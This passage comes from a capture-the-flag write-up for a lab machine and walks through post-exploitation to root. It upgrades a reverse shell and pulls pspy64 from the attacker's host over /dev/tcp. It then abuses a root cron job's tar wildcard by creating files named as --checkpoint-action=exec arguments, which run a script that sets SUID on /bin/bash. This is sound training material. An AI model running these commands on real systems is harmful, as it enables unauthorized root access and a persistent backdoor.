luigi@9a120396fb0d:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
bash: /root/.bashrc: Permission denied
```

This command makes a new bash session with **script** and **/dev/null** as the output file, because script register every command we execute in a log, but with /dev/null path, we make that log can't record commands, and **-c bash** makes script to run the shell with bash.

We do this because we want to use CTRL + C and more functions of the bash.

When we execute this, we suspend our reverse shell for a moment.

then we execute the next command in our attack machine:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.

**raw** <- With raw we are making all the data of output and input to be as raw.

**-echo** <- With this we are making that if we execute a command it will not be printed again in the output.

**; fg** <- And with this we resume our reverse shell again.

When we execute this command we reset the xterm:

```r
reset xterm
```

This are going to reset the terminal.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. we can do this in the next way to be able to clear our screen if it get nasty:

```r
luigi@9a120396fb0d:/$ export TERM=xterm
```

And one last thing, if we notice the display of the terminal is very tiny!

We can adjust this to be more bigger with the next command:

```r
luigi@9a120396fb0d:/$ stty rows {num} columns {num}
```

and finally it looks way better!

Okay after a loong time trying to escalate privileges, Im going to use **pspy64** to find process that are being executed.

But we have a problem, we can't transfer files so easy.

```r
luigi@9a120396fb0d:/$ which nc
luigi@9a120396fb0d:/$ which netcat
luigi@9a120396fb0d:/$ which ncat
luigi@9a120396fb0d:/$ which curl
luigi@9a120396fb0d:/$ which wget
luigi@9a120396fb0d:/$ which scp
```

We don't have any tool to transfer files.

But still we can do it!

And how?

We can use **cat** to receive the files, and netcat in our machine as a receptor, and send back to the emisor the file.

How can we do it?

let's make an example:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ echo "testing funny hehe :3" > testing.txt
```

We are saving that content into a file testing.txt.

Now let's make a netcat listener to send back the emisor the file.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ nc -lvnp 1111 < testing.txt 
listening on [any] 1111 ...
```

Okay now let's use cat to receive the file.

```r
luigi@9a120396fb0d:/$ cat < /dev/tcp/172.17.0.1/1111
testing funny hehe :3
```

We can see the content of the file, so we can use this to transfer files, is more insecure and probable to corrupt the file if the transfer or the connection shutdown, but still is possible.

let's make the same process to transfer **pspy64**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ nc -lvnp 1111 < pspy64 
listening on [any] 1111 ...
```

And execute cat to save the content into a file.

```r
luigi@9a120396fb0d:/tmp$ cat < /dev/tcp/172.17.0.1/1111 > pspy64
```

Okay now, let's give them permissions of executable.

```r
luigi@9a120396fb0d:/tmp$ ls   
pspy64  subversion
luigi@9a120396fb0d:/tmp$ chmod +x pspy64
```

Now, let's execute it and see what process are running into the machine.

```r
luigi@9a120396fb0d:/tmp$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/02/08 04:03:40 CMD: UID=1000  PID=774    | ./pspy64 
2026/02/08 04:03:40 CMD: UID=1000  PID=191    | bash 
2026/02/08 04:03:40 CMD: UID=1000  PID=190    | sh -c bash 
2026/02/08 04:03:40 CMD: UID=1000  PID=189    | script /dev/null -c bash 
2026/02/08 04:03:40 CMD: UID=1000  PID=119    | bash -i 
2026/02/08 04:03:40 CMD: UID=1000  PID=38     | /bin/bash 
2026/02/08 04:03:40 CMD: UID=1000  PID=37     | sh -c /bin/bash 
2026/02/08 04:03:40 CMD: UID=0     PID=34     | socat TCP-LISTEN:1789,reuseaddr,fork EXEC:/home/luigi/subversion/subversion,pty,raw,echo=0,setsid,ctty,stderr,setuid=luigi 
2026/02/08 04:03:40 CMD: UID=0     PID=33     | tail -f /dev/null 
2026/02/08 04:03:40 CMD: UID=0     PID=32     | /bin/bash /usr/local/bin/start_subversion.sh 
2026/02/08 04:03:40 CMD: UID=0     PID=31     | /usr/sbin/cron 
2026/02/08 04:03:40 CMD: UID=33    PID=25     | nginx: worker process 
2026/02/08 04:03:40 CMD: UID=33    PID=24     | nginx: worker process 
2026/02/08 04:03:40 CMD: UID=33    PID=23     | nginx: worker process 
2026/02/08 04:03:40 CMD: UID=33    PID=22     | nginx: worker process 
2026/02/08 04:03:40 CMD: UID=0     PID=21     | nginx: master process /usr/sbin/nginx 
2026/02/08 04:03:40 CMD: UID=0     PID=8      | svnserve -d -r /svn 
2026/02/08 04:03:40 CMD: UID=0     PID=1      | /bin/bash /entrypoint.sh 
2026/02/08 04:04:01 CMD: UID=0     PID=783    | /usr/sbin/CRON 
2026/02/08 04:04:01 CMD: UID=0     PID=784    | 
2026/02/08 04:04:01 CMD: UID=0     PID=785    | /bin/bash /usr/local/bin/backup.sh 
2026/02/08 04:04:01 CMD: UID=0     PID=786    | mkdir -p /backups 
2026/02/08 04:04:01 CMD: UID=0     PID=787    | tar -czf /backups/home_luigi_backup.tar.gz subversion 
2026/02/08 04:04:01 CMD: UID=0     PID=788    | 
2026/02/08 04:04:01 CMD: UID=0     PID=789    | /bin/sh -c gzip 
```

And we can see that is executing a cron job, that is executing a script backup.sh and makes adirectory /backups, and makes a tar file and saving it as .tar.gz while doing all of this as root (UID=0).

let's see the process job.

```r
luigi@9a120396fb0d:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/local/bin/backup.sh
```

We can see that the user root, is executing that bash script every minute.

Now let's take a look into the bash script.

```r
luigi@9a120396fb0d:/tmp$ cat /usr/local/bin/backup.sh
#!/bin/bash
mkdir -p /backups
cd /home/luigi/
tar -czf /backups/home_luigi_backup.tar.gz *
```

Seems legit, don't vulnerable to anything.

But we can still escalate privileges by this star symbol `*`

And why?

Because the user root, are moving to the home directory of luigi, and taking all the files and directories of the home of luigi, but this is bad.

why?

because with GTFObins we can execute the following command:

- **tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh**

and why? we can't execute this directly, and how to pass those arguments?

because any directory and files are being passed into the command because that star symbol.

For example if we have 3 files in in the home directory of luigi:

- **very_important.txt**
- **project.txt**
- **funny.txt**

And the command goes like this:

```r
tar -czf /backups/home_luigi_backup.tar.gz very_important.txt project.txt funny.txt
```

So what if we make a file like an argument?

we can do this, with **touch** to create those files:

```r
luigi@9a120396fb0d:/home/luigi$ touch ./--checkpoint=1
luigi@9a120396fb0d:/home/luigi$ touch ./--checkpoint-action=exec='bash funny.sh'
luigi@9a120396fb0d:/home/luigi$ ls
'--checkpoint=1'  '--checkpoint-action=exec=bash funny.sh'  subversion
```

So with this, the command are going to execute a bash script "funny.sh", but we need that bash script to execute something.

```r
luigi@c67477ef02b3:/home/luigi$ echo -e '#!/bin/bash\nchmod +s /bin/bash' > funny.sh
luigi@c67477ef02b3:/home/luigi$ cat funny.sh 
#!/bin/bash
chmod +s /bin/bash
```

With this script the command are going to execute this bash script and give permissions of SUID to the binary of bash, and escalate privileges.

So with this the cron job are going to execute funny.sh

Now, let's watch into the binary of bash with watch.

```r
luigi@9a120396fb0d:/home/luigi$ watch -n1 -x ls -l /bin/bash
```

This command are going to execute **ls -l /bin/bash** every second.

![Screenshot](/hard/Subversion/Images/image6.png)

We can see that permission was given to the binary!

Now let's execute **bash -p** to execute a  privileged bash shell

```c
luigi@c67477ef02b3:/home/luigi$ bash -p
bash-5.0# whoami
root
bash-5.0# id
uid=1000(luigi) gid=0(root) euid=0(root) groups=0(root)
```

Now, we are root ***...pwned..!***
